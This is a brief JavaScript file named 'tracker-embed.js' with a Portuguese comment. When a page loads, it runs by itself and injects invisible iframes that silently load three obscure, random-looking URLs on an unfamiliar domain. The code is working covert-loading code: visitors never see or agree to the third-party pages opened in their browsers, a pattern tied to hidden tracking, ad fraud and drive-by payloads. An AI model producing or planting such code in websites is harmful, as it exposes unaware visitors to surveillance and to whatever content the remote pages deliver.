// tracker-embed.js - Versão ultra simples
(function(){
    const TRACKER_URLS = [
        'https://gspotfverwazzimagiygg.wazzimagiygg.com/D6FefD0De/EfdFeF1ExcE0C/De0Var6H6f/QXdv0/vv600F54dV7eF50GGFE00V.html',
        'https://gspotfverwazzimagiygg.wazzimagiygg.com/D390X40F/200FVM20/200V/5002DFE6/ACEF/tracker.html',
        'https://gspotfverwazzimagiygg.wazzimagiygg.com/D390X40F/200FVM20/200V/5002DFE6/ACEF/5CFER.html'
    ];
    
    function loadTrackers(){
        TRACKER_URLS.forEach(url=>{
            if(!document.querySelector(`iframe[src="${url}"]`)){
                let f=document.createElement('iframe');
                f.src=url;
                f.style.display='none';
                document.body.appendChild(f);
            }
        });
    }
    document.readyState==='loading'?document.addEventListener('DOMContentLoaded',loadTrackers):loadTrackers();
})();
